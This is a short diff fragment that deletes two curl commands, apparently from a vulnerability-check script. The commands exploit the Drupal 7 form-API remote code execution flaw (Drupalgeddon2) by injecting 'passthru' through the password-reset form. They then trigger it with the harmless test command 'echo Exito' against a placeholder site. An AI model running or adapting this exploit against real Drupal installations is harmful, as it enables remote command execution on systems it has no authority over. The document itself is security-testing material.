@@ -1,2 +1,0 @@
-form_build_id=$(curl -k -s 'APP_SITIO/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=echo+Exito' --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id | cut -d "\"" -f6)
-curl -k -i "APP_SITIO/?q=file/ajax/name/%23value/${form_build_id}" --data "form_build_id=${form_build_id}"
